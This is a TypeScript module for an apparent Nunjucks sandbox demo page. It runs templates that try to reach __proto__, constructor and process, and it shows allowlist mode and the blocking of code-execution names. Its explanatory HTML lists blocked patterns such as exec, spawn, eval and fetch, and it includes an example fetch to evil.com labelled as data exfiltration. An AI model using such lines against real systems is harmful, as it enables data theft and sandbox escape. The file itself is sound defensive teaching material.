import type { NunjucksConfig } from '@nunjucks/core';
import { isErr, isOk, type Result } from '@nunjucks/lib';
import { escapeHtml } from './error-route-utils.ts';
import { renderDemoTemplate } from './render-template.ts';

interface TestCase {
  name: string;
  template: string;
  sandbox?: boolean;
  shouldPass?: boolean;
}

type TestOutcome = Result<string, Error>;

interface SandboxTestResult {
  name: string;
  outcome: TestOutcome;
  blocked: boolean;
  passed: boolean | null;
}

type SuiteStatusMode = 'blocked' | 'normal' | 'allowlist';

interface SandboxSuite {
  key: string;
  title: string;
  headingColor: string;
  accentColor: string;
  statusMode: SuiteStatusMode;
  introHtml: string | null;
  outroHtml: string | null;
  tests: TestCase[];
  context: Record<string, unknown>;
  config: NunjucksConfig;
}

interface RunTestsInput {
  tests: TestCase[];
  context: Record<string, unknown>;
  config?: NunjucksConfig;
}

const runTests = async ({
  tests,
  context,
  config = {},
}: RunTestsInput): Promise<SandboxTestResult[]> =>
  Promise.all(
    tests.map(async (test): Promise<SandboxTestResult> => {
      const testConfig: NunjucksConfig =
        test.sandbox === undefined
          ? config
          : { ...config, security: { ...config.security, sandbox: test.sandbox } };
      const result = await renderDemoTemplate(test.template, {
        context,
        config: testConfig,
      });
      const outcome: TestOutcome = result;
      const blocked = isErr(outcome);
      const passed =
        test.shouldPass === undefined ? null : isOk(outcome) === test.shouldPass;
      return { name: test.name, outcome, blocked, passed };
    })
  );

const outcomeError = (row: SandboxTestResult): Error | null =>
  row.outcome.ok ? null : row.outcome.error;

const outcomeOutput = (row: SandboxTestResult): string =>
  row.outcome.ok ? row.outcome.value : '';

const classifyStatus = (
  row: SandboxTestResult,
  suite: SandboxSuite
): { className: string; label: string } => {
  switch (suite.statusMode) {
    case 'blocked':
      return {
        className: row.blocked ? 'blocked' : 'allowed',
        label: row.blocked ? 'BLOCKED' : 'ALLOWED',
      };
    case 'normal':
      return {
        className:
          row.name.includes('__proto__') || row.name.includes('constructor') ? 'danger' : '',
        label: outcomeError(row) !== null ? 'Error' : 'Allowed',
      };
    case 'allowlist':
      return {
        className: row.passed ? 'passed' : 'failed',
        label: row.passed ? 'Correct' : 'Unexpected',
      };
  }
};

const statusClass = (row: SandboxTestResult, suite: SandboxSuite): string =>
  classifyStatus(row, suite).className;

const statusLabel = (row: SandboxTestResult, suite: SandboxSuite): string =>
  classifyStatus(row, suite).label;

const renderTable = (table: SandboxTestResult[], suite: SandboxSuite): string => {
  const rows = table
    .map((row) => {
      const err = outcomeError(row);
      // WHY: the success path is engine output rendered under renderDemoTemplate's forced
      // autoescape — it arrives pre-escaped; error messages are the only untrusted text
      // and are escaped explicitly above.
      const resultText = err !== null ? escapeHtml(err.message) : outcomeOutput(row);
      const statusClassName = statusClass(row, suite);
      const statusLabelText = statusLabel(row, suite);
      return (
        '<tr>' +
        '<td>' +
        escapeHtml(row.name) +
        '</td>' +
        '<td>' +
        resultText +
        '</td>' +
        '<td class="' +
        statusClassName +
        '">' +
        statusLabelText +
        '</td>' +
        '</tr>'
      );
    })
    .join('');

  const intro = suite.introHtml ?? '';
  const outro = suite.outroHtml ?? '';

  return (
    '<!DOCTYPE html>' +
    '<html>' +
    '<head>' +
    '<title>' +
    escapeHtml(suite.title) +
    '</title>' +
    '<style>' +
    'body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;max-width:900px;margin:0 auto;padding:20px}' +
    'h1{color:' +
    suite.headingColor +
    '}' +
    'table{width:100%;border-collapse:collapse;margin:20px 0}' +
    'th,td{text-align:left;padding:12px;border:1px solid #ddd}' +
    'th{background:' +
    suite.accentColor +
    ';color:white}' +
    '.blocked{background:#fee;color:#c0392b}' +
    '.allowed{background:#efe;color:#27ae60}' +
    '.passed{background:#d5f4e6;color:#27ae60}' +
    '.failed{background:#fadbd8;color:#e74c3c}' +
    '.danger{background:#fee;color:#c0392b}' +
    '.code{background:#f8f9fa;padding:15px;border-radius:8px;font-family:monospace;margin:15px 0}' +
    '.info{background:#e8f4f8;padding:15px;border-radius:8px;margin:15px 0}' +
    'a{color:#3498db}' +
    '</style>' +
    '</head>' +
    '<body>' +
    '<h1>' +
    escapeHtml(suite.title) +
    '</h1>' +
    '<p><a href="/sandbox">Back to Sandbox Demo</a></p>' +
    intro +
    '<table>' +
    '<tr><th>Test</th><th>Result</th><th>Status</th></tr>' +
    rows +
    '</table>' +
    outro +
    '</body>' +
    '</html>'
  );
};

const sandboxSuites: SandboxSuite[] = [
  {
    key: 'test',
    title: 'Sandbox Test Results',
    headingColor: '#2c3e50',
    accentColor: '#3498db',
    statusMode: 'blocked',
    introHtml: null,
    outroHtml: null,
    context: {
      user: {
        name: 'John',
        admin: true,
        data: { secret: 'EXAMPLE_API_KEY' },
      },
    },
    config: {},
    tests: [
      { name: 'Normal property', template: '{{ user.name }}', sandbox: false },
      {
        name: 'Access __proto__ (blocked)',
        template: '{{ user.__proto__ }}',
        sandbox: true,
      },
      {
        name: 'Access constructor (blocked)',
        template: '{{ user.constructor }}',
        sandbox: true,
      },
      {
        name: 'Access toString (blocked)',
        template: '{{ user.toString }}',
        sandbox: true,
      },
      {
        name: 'Access process (Node blocked)',
        template: '{{ this.process }}',
        sandbox: true,
      },
      {
        name: 'Access prototype (blocked)',
        template: '{{ user.prototype }}',
        sandbox: true,
      },
    ],
  },
  {
    key: 'normal',
    title: 'Normal Mode (No Sandbox)',
    headingColor: '#e74c3c',
    accentColor: '#e74c3c',
    statusMode: 'normal',
    introHtml:
      '<div style="background:#fff3cd;padding:15px;border-radius:8px;margin-bottom:20px"><strong>Warning:</strong> Without sandbox, templates can access dangerous properties!</div>',
    outroHtml: null,
    context: {
      user: {
        name: 'John',
        admin: true,
      },
    },
    config: {},
    tests: [
      { name: 'Normal property', template: '{{ user.name }}' },
      { name: 'Access __proto__ (DANGEROUS!)', template: '{{ user.__proto__ }}' },
      { name: 'Access constructor', template: '{{ user.constructor }}' },
    ],
  },
  {
    key: 'allowlist',
    title: 'Allowlist Mode Demo',
    headingColor: '#8e44ad',
    accentColor: '#8e44ad',
    statusMode: 'allowlist',
    introHtml:
      "<div class=\"code\"><strong>Configuration:</strong><br/>sandbox: true<br/>sandboxAllowlist: ['user', 'name']<br/>sandboxMode: 'allowlist'</div>" +
      '<p>In allowlist mode, ONLY the specified keys are allowed. Everything else is blocked.</p>',
    outroHtml:
      '<h2>How It Works</h2>' +
      '<p>In blocklist mode (default), dangerous keys are blocked but everything else is allowed.<br/>' +
      'In allowlist mode, only explicitly whitelisted keys are allowed.</p>' +
      '<pre>{ sandbox: true }' +
      "{ sandbox: true, sandboxAllowlist: ['user', 'name'], sandboxMode: 'allowlist' }</pre>",
    context: {
      user: {
        name: 'John',
        password: 'example-secret',
        admin: true,
        data: { secret: 'EXAMPLE_API_KEY' },
      },
    },
    config: {
      security: {
        sandbox: true,
        sandboxAllowlist: ['user', 'name'],
        sandboxMode: 'allowlist',
      },
    },
    tests: [
      { name: 'user.name (allowed)', template: '{{ user.name }}', shouldPass: true },
      { name: 'user.password (blocked)', template: '{{ user.password }}', shouldPass: false },
      { name: 'user.admin (blocked)', template: '{{ user.admin }}', shouldPass: false },
      { name: 'user.data (blocked)', template: '{{ user.data }}', shouldPass: false },
    ],
  },
  {
    key: 'code-execution',
    title: 'Code Execution Blocking',
    headingColor: '#c0392b',
    accentColor: '#c0392b',
    statusMode: 'blocked',
    introHtml:
      '<div class="info"><strong>Blocked patterns:</strong> setTimeout, setInterval, setImmediate, requestAnimationFrame,<br/>exec, execSync, spawn, spawnSync, eval, Function, fetch, XMLHttpRequest</div>',
    outroHtml:
      '<h2>Why Block These?</h2>' +
      '<p>These functions can be used for code injection attacks:</p>' +
      '<ul>' +
      "<li><code>setTimeout('alert(1)', 0)</code> - Timing attack</li>" +
      '<li><code>eval(userInput)</code> - Direct code execution</li>' +
      "<li><code>fetch('http://evil.com?data=' + userData)</code> - Data exfiltration</li>" +
      '</ul>',
    context: {
      user: {
        setTimeout: () => 'setTimeout',
        setInterval: () => 'setInterval',
        eval: () => 'eval',
        fetch: () => 'fetch',
        xml: () => 'XMLHttpRequest',
      },
    },
    config: { security: { sandbox: true } },
    tests: [
      {
        name: 'Access setTimeout (blocked)',
        template: '{{ user.setTimeout }}',
      },
      {
        name: 'Access setInterval (blocked)',
        template: '{{ user.setInterval }}',
      },
      {
        name: 'Access eval (blocked)',
        template: '{{ user.eval }}',
      },
      {
        name: 'Access fetch (blocked)',
        template: '{{ user.fetch }}',
      },
    ],
  },
];

export type { SandboxSuite, SandboxTestResult, TestCase };
export { renderTable, runTests, sandboxSuites };
